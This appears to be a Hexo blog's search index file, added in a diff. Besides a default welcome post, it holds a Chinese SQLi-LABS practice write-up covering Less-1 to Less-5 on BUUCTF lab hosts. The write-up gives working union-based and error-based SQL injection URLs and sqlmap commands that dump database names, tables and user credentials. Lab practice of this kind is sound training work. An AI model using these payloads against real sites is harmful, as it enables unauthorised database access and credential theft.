@@ -1,0 +1,101 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/06/22/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sqli-labs</title>
+    <url>/2021/07/06/sqli-labs/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>通过buu的靶场来练习的sql注入</p>
+</blockquote>
+<h2 id="SQLi-LABS-Page-1-Basic-Challenges"><a href="#SQLi-LABS-Page-1-Basic-Challenges" class="headerlink" title="SQLi-LABS Page-1(Basic Challenges)"></a>SQLi-LABS Page-1(Basic Challenges)</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p><img src="https://note.youdao.com/yws/api/personal/file/WEBc7b2005ed18471c1ecf8c5cfe3523227?method=download&shareKey=d2acd16cbf9a174eaffcd75ac156f1ba" alt="Less-1"></p>
+<p>通过题目提示发现注入点参数 <strong>ID</strong> 进行注入  </p>
+<ol>
+<li><p>通过测试发现有三列  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://05274f54-f4ea-409c-a519-454e1618bf2c.node4.buuoj.cn/Less-1/?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf48be6f3020f800e055af6db1cbecf62?method=download&shareKey=0a23d63a3112a7cc570fb46b039af8e4" alt="Less-1"></p>
+</li>
+<li><p>爆出当前的数据库和版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://05274f54-f4ea-409c-a519-454e1618bf2c.node4.buuoj.cn/Less-1/?id=-1&#x27;union select 1,database(),@@version--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB1563e3cc7bebef162dfc6b9ce63e40ab?method=download&shareKey=2efb37ce3691239410f63280b653a3f6" alt="Less-1"></p>
+</li>
+<li><p>爆”security”库下的表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://05274f54-f4ea-409c-a519-454e1618bf2c.node4.buuoj.cn/Less-1/?id=-1&#x27; union select 1,group_concat(table_name),@@version from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB7d8cd5ee7dc6018e354189703bb10df1?method=download&shareKey=29d0808b15a5d8d690ee11da3eab3d81" alt="Less-1"></p>
+</li>
+<li><p>爆users表下的列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://05274f54-f4ea-409c-a519-454e1618bf2c.node4.buuoj.cn/Less-1/?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB85f93c0623d1d0bf8480a52f116dcf1a?method=download&shareKey=15ffeaa243a40a3d4363cfb8d3a0d08b" alt="Less-1"></p>
+</li>
+<li><p>爆username和password下的所有字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://05274f54-f4ea-409c-a519-454e1618bf2c.node4.buuoj.cn/Less-1/?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from security.users--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb7601d449068d66a389db6693cce9ad7?method=download&shareKey=a1e8bdb1294f7b77e1a689b22a8e4138" alt="Less-1"></p>
+</li>
+</ol>
+<h4 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h4><ol>
+<li><p>爆所有库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://05274f54-f4ea-409c-a519-454e1618bf2c.node4.buuoj.cn/Less-1/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB9cf168ee082e810af5910172a989c825?method=download&shareKey=fe29180a869b47f1d7adff11dd6605da" alt="Less-1"></p>
+</li>
+<li><p>爆”security”数据库下的表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://05274f54-f4ea-409c-a519-454e1618bf2c.node4.buuoj.cn/Less-1/?id=1&quot; -D security --tables</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB48a8f30bc2e6894e0e9376a6e042de84?method=download&shareKey=d03e84b8f348b04aa158b409b91cdccd" alt="Less-1"></p>
+</li>
+</ol>
+<p>3 .爆”security”数据库下的”users”表的列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://05274f54-f4ea-409c-a519-454e1618bf2c.node4.buuoj.cn/Less-1/?id=1&quot; -D security -T users --columns</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBff95a80ad774e3d25fbaa4a43ac041d9?method=download&shareKey=d405b4b249f1cc9c038db812f28816cd" alt="Less-1"></p>
+<ol start="4">
+<li>爆”users”表下的字段<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://05274f54-f4ea-409c-a519-454e1618bf2c.node4.buuoj.cn/Less-1/?id=1&quot; -D security -T users -C id,username,password --dump</span><br></pre></td></tr></table></figure>
+<img src="https://note.youdao.com/yws/api/personal/file/WEB8e78df006d8d54dd5e56ec453b785ac8?method=download&shareKey=5d4ded92387022c7dcc6b1553eb3526f" alt="Less-1"></li>
+</ol>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>不用添加引号或注释符，直接添加语句，构造查询语句Less-1一样</p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>构造如下语句进行闭合，构造查询语句Less-1一样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ab7c5a88-3e07-4be3-8faf-0153da702337.node4.buuoj.cn/Less-3/?id=1&#x27;)--+</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>构造如下语句进行闭合，构造查询语句Less-1一样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ab7c5a88-3e07-4be3-8faf-0153da702337.node4.buuoj.cn/Less-3/?id=1&quot;)--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p><img src="https://note.youdao.com/yws/api/personal/file/WEB5d5a9e4bd9d1e6c89d47bf887328fcfa?method=download&shareKey=965ff2b8f48409b6fb9cafda89979027" alt="Less-5"><br>通过构造如下语句，可以闭合进行注入，但不会正常回显，所以通过报错注入进行查询</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a01286c0-36aa-42b5-85f7-ed3ebad204fd.node4.buuoj.cn/Less-5/?id=1&#x27;--+</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>通过order by 发现有三列</p>
+</li>
+<li><p>爆库<br>由于用group_concat会显示不下(group_concat()函数最大长度为64位)，所以通过 <strong>limit n,1</strong> 来输出数据,通过改变n的值来显示所有的数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a01286c0-36aa-42b5-85f7-ed3ebad204fd.node4.buuoj.cn/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat((select concat(schema_name) from information_schema.schemata limit 0,1),floor(rand()*2)) x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe6bf89e3b4bd4135aac13fb58dfe21cc?method=download&shareKey=b3625143114ff1e380c64e95377a5fb6" alt="Less-5"><br><img src="https://note.youdao.com/yws/api/personal/file/WEB3af87eac871fd9f291f2ea5b33bde81d?method=download&shareKey=0a2e162b37a491e9d47be039f32f09f5" alt="Less-5"><br><img src="https://note.youdao.com/yws/api/personal/file/WEB396fe52f61cfbd519c2a2c90a27d771b?method=download&shareKey=dd0cadfc74c680f745007fe0c75a9153" alt="Less-5"><br><img src="https://note.youdao.com/yws/api/personal/file/WEBcf4d8e2751eb58f13897c12e82625104?method=download&shareKey=c06ad4d1769429961565386ce24d4d49" alt="Less-5"><br><img src="https://note.youdao.com/yws/api/personal/file/WEBed24153dae05a8d9f089e60942e27282?method=download&shareKey=9ca0ee00dff3bb7bfb2687b1bcdeaf8d" alt="Less-5"><br><img src="https://note.youdao.com/yws/api/personal/file/WEB78c1e3ffd2e333d7e047301f1e2bf85b?method=download&shareKey=1efa4d15642f7ebe1c93a30baca3c52b" alt="Less-5"></p>
+</li>
+<li><p>爆’security’库下的表<br>同样的方法爆表，通过 <strong>limit n,1</strong> 改变n的值来显示所有的表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a01286c0-36aa-42b5-85f7-ed3ebad204fd.node4.buuoj.cn/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat((select concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),floor(rand()*2)) x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li>
+<li><p>爆’security’库下’users’表下的列<br>同样的方法爆表，通过 <strong>limit n,1</strong> 改变n的值来显示所有的列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a01286c0-36aa-42b5-85f7-ed3ebad204fd.node4.buuoj.cn/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat((select concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),floor(rand()*2)) x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li>
+<li><p>爆’security’库下’users’表下的字段<br>同样的方法爆表，通过 <strong>limit n,1</strong> 改变n的值来显示所有的列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a01286c0-36aa-42b5-85f7-ed3ebad204fd.node4.buuoj.cn/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat((select concat(username,&#x27;:&#x27;,password) from security.users limit 0,1),floor(rand()*2)) x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>sqli-lab</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+</search>
